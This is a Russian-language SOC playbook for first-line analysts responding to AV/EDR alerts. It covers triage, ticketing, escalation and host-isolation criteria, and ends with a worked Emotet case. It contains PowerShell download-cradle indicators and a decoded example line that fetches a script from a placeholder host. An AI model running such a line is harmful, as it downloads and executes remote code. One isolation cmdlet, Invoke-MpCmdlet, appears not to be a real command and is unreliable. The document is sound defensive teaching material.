# Действия L1 при срабатывании AV/EDR: оценка, фиксация и критерии изоляции

## 1. Контекст и роль специалиста первой линии в цепочке реагирования

Срабатывание средств защиты конечных точек — антивируса (AV) или платформы обнаружения и реагирования (EDR) — является первичным сигналом для специалиста первой линии мониторинга (L1 SOC). Роль аналитика L1 в этом сценарии сводится к выполнению стандартизованной процедуры: быстрая первичная оценка серьёзности события, документирование всех существенных деталей и принятие решения о необходимости изоляции хоста либо немедленной эскалации инцидента. От скорости и точности этих действий напрямую зависит способность организации ограничить ущерб от атаки.

**AV и EDR: смежные, но функционально различные инструменты**  
Хотя оба класса решений оперируют на конечных точках и генерируют алерты, их внутренняя логика и объём предоставляемой информации принципиально различаются. Понимание этих различий критически важно для L1, поскольку определяет глубину доступного контекста и набор немедленных действий по проверке.

| Характеристика | Антивирус (AV) | EDR-платформа |
|----------------|----------------|----------------|
| Основной метод детектирования | Сигнатурный анализ, эвристика по статическим признакам (хеш‑суммы, сигнатуры файлов) | Поведенческий анализ: последовательности событий, аномалии процессов, сетевые индикаторы |
| Типичный состав алерта | Имя обнаруженной угрозы, путь к файлу, действие (удалён/помещён в карантин), иногда хеш | Полная цепочка событий процесса (process tree), сетевые соединения, аргументы командной строки, временные метки изменений в системе |
| Контекст для L1 | Минимален — часто требует ручного сбора дополнительных артефактов | Богатый — содержит все ключевые артефакты для первичного анализа без входа на узел |
| Роль L1 | Подтверждение факта обнаружения, проверка ложноположительных срабатываний, инициация полного сканирования | Триаж поведенческого алерта, корреляция процессов, определение стадии атаки, рекомендация по изоляции |

В современных SOC поток событий обычно поступает с EDR-агентов, тогда как классические антивирусные алерты интегрируются через SIEM-систему либо разбираются как события Windows `EventID 1116/1117` (Microsoft Defender). Специалист L1 взаимодействует как с консолью самой EDR-платформы (CrowdStrike Falcon, Microsoft 365 Defender, SentinelOne), так и с карточкой инцидента в SOAR или тикет-трекинговой системе.

**Место L1 в цепочке реагирования**  
Согласно модели обработки инцидентов NIST SP 800‑61 (Computer Security Incident Handling Guide), действия L1 при срабатывании AV/EDR относятся к фазе «Detection and Analysis». Специалист выполняет начальный триаж, классифицирует событие (incident / event / false positive) и либо закрывает алерт с документированием причин, либо эскалирует полноценный инцидент на вторую линию. Если инцидент подтверждён и активен, L1 может выполнить временную изоляцию хоста согласно утверждённым процедурам, после чего передаёт кейс группе углублённого анализа (L2/L3) и реагирования (IR).

Таким образом, три ключевые взаимосвязанные обязанности L1 в сценарии AV/EDR‑алерта:
- первичная оценка серьёзности и достоверности срабатывания;
- формальная фиксация события (создание инцидента/кейса) с сохранением всех собранных артефактов;
- принятие решения об изоляции узла на основании ясных критериев и выполнение изоляции.

## 2. Оценка срабатывания: методика, артефакты и критерии серьёзности

Первичная оценка (триаж) должна дать ответ на два вопроса: является ли обнаружение истинным вредоносным событием (true positive) и представляет ли оно немедленную угрозу, требующую изоляции. Процесс оценки строится по стандартизованной «воронке» проверок, которая опирается исключительно на данные из алерта, консоли EDR и доступных источников threat intelligence (TI).

**Шаг 1. Чтение и декомпозиция алерта**  
Любой алерт EDR содержит обязательный перечень полей, значения которых необходимо проанализировать. Типовой JSON‑документ алерта (в форматах различных вендоров) имеет следующую иллюстративную структуру:

```json
{
  "alert_id": "уникальный идентификатор события детектирования",
  "severity": "High / Medium / Low / Informational",
  "timestamp": "2025-01-15T08:12:33Z",
  "hostname": "именная‑рабочая‑станция",
  "username": "учётная запись пользователя или SYSTEM",
  "detection_type": "Behavioural / Signature / ML",
  "process_tree": [
    {
      "pid": 4520,
      "parent_pid": 1204,
      "image_path": "исходный путь исполняемого файла или скрипта",
      "command_line": "аргументы командной строки",
      "hash_sha256": "иллюстративная схема — 64‑символьная hex‑строка",
      "signed": false
    }
  ],
  "network_connections": [
    {
      "dst_ip": "иллюстративная схема",
      "dst_port": 443,
      "protocol": "tcp",
      "bytes_sent": 14500
    }
  ],
  "file_modifications": [
    {
      "action": "create",
      "path": "путь созданного файла"
    }
  ]
}
```

Первоочередной фокус аналитика:
- `severity` — категория, назначенная самой EDR-платформой на основе встроенных политик; всегда проверяется, но не должна быть единственным критерием.
- `command_line` и `parent`‑процесс — главный контекст для оценки замысла злоумышленника.
- `hash_sha256` — используется для поиска по внутренним или публичным базам TI.
- `network_connections` — наличие подключения к низко‑репутационному IP или домену сильно повышает критичность.
- `username` и `hostname` — позволяют сопоставить событие с профилем пользователя и критичностью узла.

**Шаг 2. Проверка по threat intelligence и внутренним базам**  
После извлечения хешей файлов и IP‑адресов выполняется их верификация. При наличии доступа к VirusTotal API (или внутреннему аналогу) L1 может выполнить запрос:

```powershell
$fileHash = "иллюстративная схема SHA‑256"
$headers = @{ "x-apikey" = "API‑ключ из переменной окружения" }
Invoke-RestMethod -Uri "https://www.virustotal.com/api/v3/files/$fileHash" -Headers $headers
```

Ответ API содержит количество детектов (`last_analysis_stats.malicious`), имена детектирующих движков и ссылки на связанные отчёты. При этом важно помнить: нулевой детект на VirusTotal не гарантирует безвредность файла, особенно если он был загружен недавно или относится к целевым атакам.

Кроме хешей, L1 проверяет репутацию IP‑адресов и доменов, используя внутренний TI‑список или запросы к тем же API. Если EDR обнаружил аномальное DNS‑разрешение (например, алгоритмически сгенерированный домен), это сразу повышает серьёзность.

**Шаг 3. Анализ дерева процессов и поведения**  
EDR предоставляет визуализацию цепочки процессов (process tree). Задача аналитика — реконструировать первоначальный вектор. Ключевые индикаторы атаки (IoC) при анализе процесса:

- Запуск интерпретатора (`powershell.exe`, `wscript.exe`, `mshta.exe`) дочерним процессом офисного приложения (`winword.exe`, `excel.exe`) — типично для фишинговых документов с макросами.
- PowerShell с аргументами, содержащими `-EncodedCommand`, `IEX (New-Object Net.WebClient).DownloadString` — однозначный признак загрузки кода из интернета.
- Процесс `svchost.exe`, запущенный не от `services.exe` или имеющий нестандартные аргументы, — возможна кодо‑инжекция.
- Модификация реестра в ветках `Run` / `RunOnce` — создание персистентности.

Если EDR‑алерт сработал на конкретную технику MITRE ATT&CK (например, T1059.001 — PowerShell, T1055 — Process Injection, T1071.001 — Web Protocols), аналитик L1 может немедленно определить стадию Kill Chain.

**Шаг 4. Исключение ложноположительных срабатываний**  
Ложные срабатывания в EDR возникают регулярно, особенно при активной административной деятельности, тестировании или обновлении ПО. Аналитик обязан аргументированно закрыть алерт как `false positive`, только если уверен в легитимности наблюдаемого поведения. Типичные сценарии:

- Запуск утилит администрирования (`PsExec`, `WinRM`, `PowerShell Remoting`) учётными записями администраторов с ожидаемых рабочих станций (jump‑хостов).
- Установка драйверов или критических обновлений системным процессом, создающим временные исполняемые файлы.
- Действия официальных инструментов для снятия дампов памяти (ProcDump с подписью Microsoft).
- Автоматические скрипты управления конфигурацией (SCCM, Ansible), массово развёртывающие легитимное ПО.

Для каждого такого случая L1 должен иметь возможность подтвердить источник: соответствие IP административной машины, наличие подписанного сертификата, документально оформленный Change Request. Если хотя бы одно звено вызывает сомнения, алерт остаётся true positive и обрабатывается дальше.

**Критерии серьёзности (severity assessment)**  
На основе собранных данных L1 присваивает инциденту один из уровней серьёзности, используя таблицу критериев, согласованную с IR‑группой. Примерная классификация:

| Уровень | Критерии | Действия L1 |
|---------|----------|-------------|
| Critical | Обнаружена активная C2-связь с известным вредоносным IP, выполнение кода с привилегиями SYSTEM, криптолокер, перемещение по сети (lateral movement) | Немедленная изоляция хоста, эскалация на L2 и IR, уведомление руководителя SOC |
| High | Потенциальная загрузка вредоносного ПО (неподписанный экзешник из временной папки), запуск PowerShell с обфусцированной командой, обнаружение известного банкера/трояна в режиме ожидания | Изоляция хоста, сохранение всех артефактов, создание инцидента с высоким приоритетом |
| Medium | Подозрительная активность без явных признаков компрометации: нестандартный родительский процесс для легитимного приложения, нетипичная сетевая активность непривилегированного пользователя, эвристическое детектирование | Проводится дополнительный анализ EDR (поиск дополнительных IoC), пока без изоляции; при накоплении признаков повышается уровень |
| Low / Info | Одиночное срабатывание сигнатуры на рекламное ПО (PUA), автоматическое тестирование, действия администраторов в рамках штатных задач | Алерт закрывается как событие либо false positive с обязательным комментарием и скриншотом |

Именно по итогам оценки L1 принимает решение о переходе к изоляции. Сама оценка должна занимать не более 10‑15 минут с момента поступления срабатывания.

## 3. Фиксация инцидента: структура записи, артефакты и эскалация

Каждое обработанное срабатывание должно быть задокументировано в системе управления инцидентами (тикет-система ITSM, SOAR‑плейбук или журнал SIEM). Фиксация решает три задачи: гарантирует прослеживаемость всех решений аналитика, создаёт основу для будущего углублённого анализа и позволяет формировать статистику для отчётности.

**Обязательные поля тикета инцидента**  
Шаблон записи различается в зависимости от внедрённого инструмента, но минимальный набор полей стандартизован на уровне отраслевых практик. Пример карточки в формате, пригодном для передачи в SOAR‑средствах:

```text
Название инцидента: подозрительная PowerShell‑активность на хосте %hostname%
ID алерта: %alert_id%
Дата и время срабатывания: 2025-01-15 08:12:33 UTC
Хост: рабочая-станция-123
Пользователь: buh_user3
Тип детекта: Behavioural (MITRE T1059.001)
Серьёзность: High

Описание инцидента:
Алерт EDR зафиксировал запуск powershell.exe как дочернего процесса excel.exe.
Командная строка содержала закодированный Base64‑блок, декодирование показало
загрузку скрипта с внешнего ресурса. Инициирована связь с IP‑адресом,
классифицированным threat intelligence как C2‑сервер трояна Emotet.

Действия L1:
1. Извлечены хеш скрипта и IP‑адрес.
2. Проверка по VirusTotal: 34/70 детектов.
3. Проанализировано дерево процессов: подтверждена техника T1204.001 (malicious document).
4. Выполнена изоляция хоста через EDR‑консоль.
5. Создан инцидент, уведомлена L2‑группа IR.

Артефакты:
- Скриншот дерева процессов: process_tree.png
- Лог командной строки: cmdline.txt
- Выгрузка сетевых соединений: netconn.csv
- Ответ VirusTotal: vt_response.json

Статус: Эскалирован на L2, ожидание анализа памяти.
```

Документирование удобнее выполнять непосредственно в инструменте оркестрации. Пример создания тикета через API (условный SOAR‑бэкенд) с использованием curl:

```bash
curl -X POST https://soar-платформа.компания.ru/api/v1/incident \
  -H "Authorization: Bearer $API_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Подозрительный PowerShell | хост: fin-dept-12",
    "alert_id": "edr-4815162342",
    "severity": "High",
    "source": "Microsoft Defender for Endpoint",
    "hostname": "fin-dept-12",
    "username": "ivanov.aa",
    "artifacts": ["proc_tree.png", "netconn.csv"],
    "description": "...",
    "actions_taken": "Isolation via EDR"
  }'
```

В ответ система возвращает номер инцидента, по которому затем будет вестись вся хронология.

**Порядок фиксации и временные метки**  
L1 обязан фиксировать время каждого предпринятого действия: время получения алерта, время начала оценки, момент принятия решения об изоляции, время эскалации. Это критически важно для post‑mortem анализа и расчёта показателей MTTD (Mean Time to Detect) и MTTR (Mean Time to Respond). В EDR‑консолях все действия с хостами автоматически логируются, но реконструкция мыслительного процесса аналитика ложится именно в тикет.

**Критерии эскалации на L2/L3**  
Не каждый инцидент L1 должен решать полностью. Эскалация происходит в следующих случаях:

- Уровень серьёзности определён как `High` или `Critical`, и требуется углублённый анализ (реверсинг, создание IoC‑правил, поиск первоначального вектора).
- Обнаружены признаки целевой атаки (APT) — нестандартные техники, неизвестные вредоносные инструменты.
- Аналитик L1 не может однозначно определить, является ли алерт true positive, и консультация более опытного коллеги необходима.
- После изоляции хоста требуется дальнейшее расследование (дампинг памяти, анализ диска) — компетенция L2‑форензика.
- Срабатывания одновременно на нескольких узлах одного сегмента с похожими IoC — потенциальная вспышка (worm‑активность).

Процедура эскалации включает передачу полностью заполненной карточки инцидента с полным комплектом артефактов, а также личное уведомление дежурного L2 по каналу экстренной связи. Устная постановка задачи: «Инцидент №12345, хост изолирован, файлы доступны, TI‑кросс‑проверка выполнена» — обеспечивает быстрый вход в контекст.

## 4. Критерии изоляции и порядок немедленных действий

Решение об изоляции хоста — один из наиболее ответственных шагов, которые L1 может предпринять в рамках своей компетенции. Изоляция представляет собой контрмеру, направленную на разрыв активных сетевых соединений и предотвращение распространения угрозы, но одновременно лишает пользователя возможности работать. Поэтому должны быть чётко определены условия, при которых L1 *обязан* изолировать узел, а также когда решение передаётся на более высокий уровень.

**Критерии, требующие немедленной изоляции (L1 действует самостоятельно):**
Набор «жёстких» критериев вырабатывается в каждой организации, но базируется на обобщённой таблице решений, увязанной с индикаторами атаки:

| Индикатор | Признаки | Действие L1 |
|-----------|----------|-------------|
| Подтверждённая C2‑активность | Процесс инициирует регулярные HTTPS‑соединения с IP, числящимся в TI‑списке как C2, POST‑запросы без легитимного трафика | Немедленная изоляция EDR‑средствами |
| Обнаружение известного шифровальщика | Массовое переименование файлов с характерными расширениями (`.locked`, `.crypt`) или срабатывание поведенческого детекта `RansomwareBehavior` | Изоляция + параллельное уведомление IR‑группы |
| Lateral Movement | Процесс на хосте открывает SMB/PSRemoting/WMI‑подключения к соседним узлам от несистемной учётной записи | Изоляция для предотвращения распространения |
| Подозрительный PowerShell с кодом удалённого управления | Вызов функций `Invoke-Command`, `Enter-PSSession` на внешние адреса, загрузка скриптов с неизвестных URL с последующей передачей на другие машины | Изоляция |
| Детектирование вредоносного ПО с высоким рейтингом опасности | Антивирусное ядро EDR идентифицировало трояна класса `TrojanSpy`, `Backdoor` сработало на файл, находящийся в автозагрузке | Изоляция, пока процесс не активизировался повторно |

**Ситуации, в которых изоляция выполняется только по решению L2 или руководителя смены:**
- Хост является критически важным сервером (контроллер домена, сервер баз данных, промышленный SCADA‑узел) — даже подтверждённая активность может требовать не изоляции, а точечного блокирования процессов и немедленного включения IR‑команды.
- Алерт сработал на легитимный, но чувствительный бизнес‑процесс (например, скрипт резервного копирования, использующий PowerShell), и есть сомнения.
- Политика организации требует двойного подтверждения для любых деструктивных действий.

**Способы изоляции хоста инструментами L1**
В зависимости от доступного арсенала L1 владеет несколькими техниками принудительной изоляции. Наиболее управляемый и предпочтительный путь — использование штатного механизма EDR‑платформы.

Пример команды в Microsoft Defender for Endpoint (через PowerShell или API):

```powershell
# Изоляция хоста (network isolation)
Invoke-MpCmdlet -Command "isolate-machine" -MachineId "fin-dept-12.contoso.com"
```

Аналогичный вызов через REST API той же платформы (иллюстративная схема):

```bash
curl -X POST "https://api.securitycenter.microsoft.com/api/machines/{machine_id}/isolate" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
        "Comment": "Изоляция: обнаружена C2-активность / PowerSploit",
        "IsolationType": "Full"
      }'
```

Если EDR недоступен или агентом не охвачен, L1 может использовать административные средства ОС (при наличии прав). Однако в хорошо организованном SOC прямое вмешательство в ОС не приветствуется, поскольку нарушает сохранность улик. Допустим лишь временный обрыв сетевого соединения:

```powershell
# Отключение сетевого адаптера (экстренная мера)
Disable-NetAdapter -Name "Ethernet0" -Confirm:$false
```

Более элегантный подход — помещение машины в изолированный VLAN через API NAC‑решения (Cisco ISE, Forescout) по команде L1, если такая интеграция есть.

**Действия сразу после изоляции**  
После нажатия кнопки «изолировать» аналитик L1 обязан выполнить ещё несколько шагов, чтобы обеспечить полную готовность инцидента для L2‑аналитиков:

1. Убедиться, что изоляция применилась (в консоли EDR хост переходит в статус `Isolated`, а в последних событиях появляется запись об изменении состояния).
2. Запросить (автоматически через SOAR‑плейбук или вручную) сбор артефактов: дамп памяти, копия реестра, архив логов, снапшот диска. Это может быть выполнено EDR‑агентом в фоновом режиме.
3. Выполнить блокировку учётной записи пользователя в AD, если инцидент связан с компрометацией конкретного аккаунта. Команда L1 в PowerShell:

```powershell
# Блокировка учётной записи (оставляем возможность разобраться паролем позже)
Disable-ADAccount -Identity "buh_user3"
```

4. Сбросить сеансы пользователя на других узлах (Terminal Services, VPN), чтобы исключить активные сессии атакующего:

```powershell
# Завершение всех сессий пользователя (требует прав администратора RDS)
Invoke-Command -ComputerName "rds-farm.contoso.com" -ScriptBlock { 
    Get-RDUserSession | Where-Object { $_.Username -eq "buh_user3" } | Disconnect-RDUserSession 
}
```

5. Зафиксировать факт изоляции в тикете с точным временем и подтверждением статуса.

Эти действия гарантируют, что передаваемый L2‑команде инцидент будет иметь «замороженную» среду и максимально полный уликовый материал.

## 5. Сквозной практический пример: от алерта Microsoft Defender for Endpoint до изоляции рабочей станции

**Исходные условия**  
- Организация использует Microsoft 365 Defender (MDE) в качестве EDR на всех рабочих станциях. SIEM не задействован для первичного триажа — аналитик L1 работает напрямую в консоли security.microsoft.com.
- Аналитик получает уведомление в мониторинговой панели об алерте `"Suspicious PowerShell execution from Office application"` с присвоенной платформой серьёзностью `Medium`.  
- Целевой хост: `ACCT-DEPT04`, пользователь `petrova.va` (бухгалтер).  
- Инструменты L1: PowerShell с доступом к API VirusTotal, консоль MDE, система тикетов Jira.

**Шаг 1. Извлечение деталей алерта**  
Аналитик открывает карточку алерта в MDE и видит следующую структуру (ключевые поля, упрощённый JSON):

```json
{
  "alertId": "da63752...",
  "incidentId": 45218,
  "severity": "Medium",
  "detectionSource": "WindowsDefenderSmartScreen",
  "category": "SuspiciousActivity",
  "title": "PowerShell запущен как дочерний процесс Excel",
  "entities": [
    {
      "entityType": "Process",
      "processName": "powershell.exe",
      "commandLine": "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBj...",
      "parentProcessName": "excel.exe",
      "fileHash": "иллюстративная схема SHA‑256 PowerShell‑скрипта"
    }
  ],
  "alertCreationTime": "2025-01-15T08:12:33.456Z",
  "machineId": "acct-dept04.contoso.com",
  "userName": "petrova.va"
}
```

Аналитик фиксирует: Excel породил PowerShell с закодированной строкой — классический признак макросов документа.

**Шаг 2. Оценка серьёзности: декодирование и проверка хеша**  
L1 извлекает Base64‑строку и декодирует её локально (без исполнения!) командой PowerShell:

```powershell
$encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBj..."
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
```

Результат (иллюстративный вывод):
```text
IEX (New-Object Net.WebClient).DownloadString('http://temp.example.org/script.txt')
```
Этот приём (IEX + DownloadString) является индикатором загрузки удалённого кода, техника T1059.001.

Далее L1 проверяет хеш PowerShell‑скрипта, извлечённый из алерта:

```powershell
$hash = "иллюстративная схема SHA‑256"
Invoke-RestMethod -Uri "https://www.virustotal.com/api/v3/files/$hash" -Headers @{"x-apikey" = $env:VT_KEY}
```

Приходит ответ (упрощён):
```json
{
  "data": {
    "attributes": {
      "last_analysis_stats": { "malicious": 41, "suspicious": 8, "undetected": 11 },
      "crowdsourced_ids_results": [ { "rule_category": "powershell_downloader" } ]
    }
  }
}
```
Значительное количество детектов подтверждает вредоносность. Внутренний TI‑лист угроз определяет этот конкретный скрипт как дроппер семейства Emotet.

Дополнительно аналитик смотрит в консоли MDE вкладку «Timeline» событий для данного хоста и видит, что сразу после запуска PowerShell был создан файл `C:\Users\petrova.va\AppData\Local\Temp\em.dll`, а затем произведено DNS-разрешение имени `x5z2.example.info` на IP, уже помеченный в TI как C2.

Суммируя, L1 делает вывод: true positive с активной C2‑связью и загрузкой DLL — серьёзность повышается до `High`.

**Шаг 3. Фиксация инцидента в тикет-системе**  
Аналитик создаёт инцидент в Jira, используя REST API (иллюстративная команда):

```bash
curl -X POST https://jira.компания.ru/rest/api/2/issue \
  -u "l1_user:$JIRA_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "fields": {
      "project": { "key": "SOC" },
      "issuetype": { "name": "Security Incident" },
      "summary": "MDE alert: Emotet macro powershell -> C2 на ACCT-DEPT04",
      "description": "Пользователь petrova.va открыл документ Excel с макросом, запущен PowerShell с удалённой загрузкой dll. Обнаружена связь с C2 x5z2.example.info. Хеш скрипта: ... | VirusTotal: 41/70 детектов. Принято решение об изоляции.",
      "priority": { "name": "Highest" },
      "labels": ["emotet", "T1059.001", "isolated"]
    }
  }'
```

Тикету присваивается номер SOC‑2548. В карточку вложены скриншоты дерева процессов и ответа VirusTotal.

**Шаг 4. Изоляция хоста и блокировка учётной записи**  
На основании критериев (активная C2‑связь, известное вредоносное семейство, хост относится к финансовому отделу) L1 немедленно выполняет полную сетевую изоляцию через MDE. В консоли портала Microsoft 365 Defender аналитик выбирает устройство `ACCT-DEPT04`, нажимает «Изолировать машину» и вводит комментарий: «C2-канал Emotet, изоляция L1. Инцидент SOC‑2548.»

API‑аналог действия (справочно для автоматизации):

```bash
curl -X POST "https://api.securitycenter.microsoft.com/api/machines/{machine_id}/isolate" \
  -H "Authorization: Bearer $MDE_TOKEN" \
  -d '{"Comment":"SOC-2548 Emotet C2","IsolationType":"Full"}'
```

Через 20 секунд состояние машины в консоли меняется на `Isolated`. Аналитик делает скриншот подтверждения и добавляет в тикет.

Параллельно выполняется отключение учётной записи `petrova.va` в Active Directory:

```powershell
Disable-ADAccount -Identity "petrova.va"
```

На всех фермах терминальных серверов завершаются сеансы пользователя для ликвидации потенциальных активных подключений злоумышленника:

```powershell
$sessions = Get-RDUserSession | Where-Object {$_.UserName -eq "PETROVA.VA"}
$sessions | Disconnect-RDUserSession
```

**Ожидаемый вывод**  
В результате действий L1 достигнута полная изоляция скомпрометированной рабочей станции до того, как злоумышленник успел развить атаку за пределы начального узла. Сохранённые артефакты (логи EDR, дамп памяти по запросу) и заполненный тикет позволяют группе L2 немедленно приступить к углублённому анализу и восстановлению. Критическое время реагирования (MTTR) составило 11 минут с момента появления алерта.
